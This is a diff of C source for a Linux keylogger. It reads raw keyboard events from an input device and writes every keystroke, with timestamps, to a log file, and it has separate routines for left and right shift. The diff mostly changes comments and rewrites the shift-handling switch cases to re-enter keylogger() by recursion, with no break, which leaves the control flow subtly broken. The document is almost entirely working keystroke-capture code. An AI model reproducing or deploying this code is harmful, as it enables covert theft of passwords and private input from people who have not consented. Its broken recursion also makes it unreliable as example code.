@@ -11,7 +11,8 @@
 #include "../includes/utils.h"
 
 
-
+/*  Log all keyboard keys exept when shift left or right is used.
+    Add the date and hours of all keyboard event in the log file */
 void keylogger(char *deviceFile)
 {
     int bytesRead = 0;
@@ -37,9 +38,6 @@ void keylogger(char *deviceFile)
         error("open()\nFonction : open_kb_device()");
 
     setbuf(log, NULL);
-
-    if(ev.type == EV_KEY && ev.code == 54 && ev.value == 0)
-        printf("Hello");
 
     while(1)
     {
@@ -129,7 +127,7 @@ void keylogger(char *deviceFile)
                 case 67 : fputs("F9 : ", log); fputs(buffer, log); fputs("\n", log); break;
                 case 68 : fputs("F10 : ", log); fputs(buffer, log); fputs("\n", log); break;
                 case 69: fputs("num lock : ", log); fputs(buffer, log); fputs("\n", log); break;
-/*A VERIFIER*/  case 70 : fputs("Scroll Lock : ", log); fputs(buffer, log); fputs("\n", log); break;
+                case 70 : fputs("Scroll Lock : ", log); fputs(buffer, log); fputs("\n", log); break;
                 case 71 : fputs("[Pav num.] 7 : ", log); fputs(buffer, log); fputs("\n", log); break;
                 case 72 : fputs("[Pav num.] 8 : ", log); fputs(buffer, log); fputs("\n", log); break;
                 case 73 : fputs("[Pav num.] 9 : ", log); fputs(buffer, log); fputs("\n", log); break;
@@ -174,7 +172,7 @@ void keylogger(char *deviceFile)
 
 }
 /*  Log right shift + key and and write the key in the log file.
- *  Then the fonction give back the hand to the main keyllogger fonction called keylloger()
+ *  Then the function give back the hand to the main keylogger function
  */
 
 void Rshift_used(char *deviceFile)
@@ -261,13 +259,10 @@ void Rshift_used(char *deviceFile)
             }
         }
     }
-
-    fclose(log);
-
 }
 
 /*  Log left shift + key and and write the key in the log file.
- *  Then the fonction give back the hand to the main keyllogger fonction called keylloger()
+ *  Then the function give back the hand to the main keyllogger function.
  */
 
 void Lshift_used(char *deviceFile)
@@ -303,6 +298,7 @@ void Lshift_used(char *deviceFile)
 
         if(Lshift_ev.type == EV_KEY && Lshift_ev.value == 1)
         {
+
             switch(Lshift_ev.code)
             {
                 case 2 : fputs("1 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
@@ -354,12 +350,9 @@ void Lshift_used(char *deviceFile)
             }
         }
     }
-
-    fclose(log);
-
 }
 
-/*  Same stuff with the only difference that shift is sustained */
+/*  Same stuff with the only difference that right shift is sustained */
 
 void Rshift_used_sustained(char *deviceFile)
 {
@@ -396,50 +389,50 @@ void Rshift_used_sustained(char *deviceFile)
         {
             switch(sustain_Rshift_ev.code)
             {
-                case 2 : fputs("1 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 3 : fputs("2 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 4 : fputs("3 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 5 : fputs("4 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 6 : fputs("5 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 7 : fputs("6 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 8 : fputs("7 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 9 : fputs("8 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 10 : fputs("9 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 11 : fputs("0 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 16 : fputs("A : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 17 : fputs("Z : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 18 : fputs("E : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 19 : fputs("R : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 20 : fputs("T : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 21 : fputs("Y : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 22 : fputs("U : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 23 : fputs("I : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 24 : fputs("O : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 25 : fputs("P : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 26 : fputs("¨ : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 27 : fputs("£ : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 30 : fputs("Q : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 31 : fputs("S : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 33 : fputs("F : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 34 : fputs("G : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 35 : fputs("H : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 36 : fputs("J : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 37 : fputs("K : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 38 : fputs("L : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 39 : fputs("M : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 40 : fputs("% : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 43 : fputs("µ : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 44 : fputs("W : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 45 : fputs("X : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 46 : fputs("C : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 47 : fputs("V : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 48 : fputs("B : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 49 : fputs("N : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 50 : fputs("? : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 51 : fputs(". : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 52 : fputs("/ : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 53 : fputs("§ : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 86 : fputs("> : ", log); fputs(buffer, log); fputs("\n", log); break;
+                case 2 : fputs("1 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 3 : fputs("2 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 4 : fputs("3 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 5 : fputs("4 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 6 : fputs("5 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 7 : fputs("6 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 8 : fputs("7 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 9 : fputs("8 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 10 : fputs("9 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 11 : fputs("0 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 16 : fputs("A : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 17 : fputs("Z : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 18 : fputs("E : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 19 : fputs("R : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 20 : fputs("T : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 21 : fputs("Y : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 22 : fputs("U : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 23 : fputs("I : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 24 : fputs("O : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 25 : fputs("P : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 26 : fputs("¨ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 27 : fputs("£ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 30 : fputs("Q : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 31 : fputs("S : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 33 : fputs("F : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 34 : fputs("G : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 35 : fputs("H : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 36 : fputs("J : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 37 : fputs("K : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 38 : fputs("L : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 39 : fputs("M : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 40 : fputs("% : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 43 : fputs("µ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 44 : fputs("W : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 45 : fputs("X : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 46 : fputs("C : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 47 : fputs("V : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 48 : fputs("B : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 49 : fputs("N : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 50 : fputs("? : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 51 : fputs(". : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 52 : fputs("/ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 53 : fputs("§ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 86 : fputs("> : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
 
                 case 88 : fputs("\nF12 : ", log); fputs(buffer, log); fputs(" Quitting...\n\n", log); exit(EXIT_SUCCESS);  /*F12 for getting out properly of the loop */
 
@@ -447,11 +440,9 @@ void Rshift_used_sustained(char *deviceFile)
             }
         }
     }
-
-    keylogger(deviceFile);
-
 }
 
+/*  Same with left shift sustained */
 void Lshift_used_sustained(char *deviceFile)
 {
     int bytesRead = 0;
@@ -487,50 +478,50 @@ void Lshift_used_sustained(char *deviceFile)
         {
             switch(sustain_Lshift_ev.code)
             {
-                case 2 : fputs("1 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 3 : fputs("2 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 4 : fputs("3 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 5 : fputs("4 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 6 : fputs("5 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 7 : fputs("6 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 8 : fputs("7 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 9 : fputs("8 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 10 : fputs("9 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 11 : fputs("0 : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 16 : fputs("A : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 17 : fputs("Z : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 18 : fputs("E : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 19 : fputs("R : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 20 : fputs("T : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 21 : fputs("Y : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 22 : fputs("U : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 23 : fputs("I : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 24 : fputs("O : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 25 : fputs("P : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 26 : fputs("¨ : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 27 : fputs("£ : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 30 : fputs("Q : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 31 : fputs("S : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 33 : fputs("F : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 34 : fputs("G : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 35 : fputs("H : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 36 : fputs("J : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 37 : fputs("K : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 38 : fputs("L : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 39 : fputs("M : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 40 : fputs("% : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 43 : fputs("µ : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 44 : fputs("W : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 45 : fputs("X : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 46 : fputs("C : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 47 : fputs("V : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 48 : fputs("B : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 49 : fputs("N : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 50 : fputs("? : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 51 : fputs(". : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 52 : fputs("/ : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 53 : fputs("§ : ", log); fputs(buffer, log); fputs("\n", log); break;
-                case 86 : fputs("> : ", log); fputs(buffer, log); fputs("\n", log); break;
+                case 2 : fputs("1 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 3 : fputs("2 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 4 : fputs("3 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 5 : fputs("4 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 6 : fputs("5 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 7 : fputs("6 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 8 : fputs("7 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 9 : fputs("8 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 10 : fputs("9 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 11 : fputs("0 : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 16 : fputs("A : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 17 : fputs("Z : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 18 : fputs("E : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 19 : fputs("R : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 20 : fputs("T : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 21 : fputs("Y : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 22 : fputs("U : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 23 : fputs("I : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 24 : fputs("O : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 25 : fputs("P : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 26 : fputs("¨ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 27 : fputs("£ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 30 : fputs("Q : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 31 : fputs("S : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 33 : fputs("F : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 34 : fputs("G : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 35 : fputs("H : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 36 : fputs("J : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 37 : fputs("K : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 38 : fputs("L : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 39 : fputs("M : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 40 : fputs("% : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 43 : fputs("µ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 44 : fputs("W : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 45 : fputs("X : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 46 : fputs("C : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 47 : fputs("V : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 48 : fputs("B : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 49 : fputs("N : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 50 : fputs("? : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 51 : fputs(". : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 52 : fputs("/ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 53 : fputs("§ : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
+                case 86 : fputs("> : ", log); fputs(buffer, log); fputs("\n", log); keylogger(deviceFile);
 
                 case 88 : fputs("\nF12 : ", log); fputs(buffer, log); fputs(" Quitting...\n\n", log); exit(EXIT_SUCCESS);  /*F12 for getting out properly of the loop */
 
@@ -538,9 +529,6 @@ void Lshift_used_sustained(char *deviceFile)
             }
         }
     }
-
-    keylogger(deviceFile);
-
 }
 
 
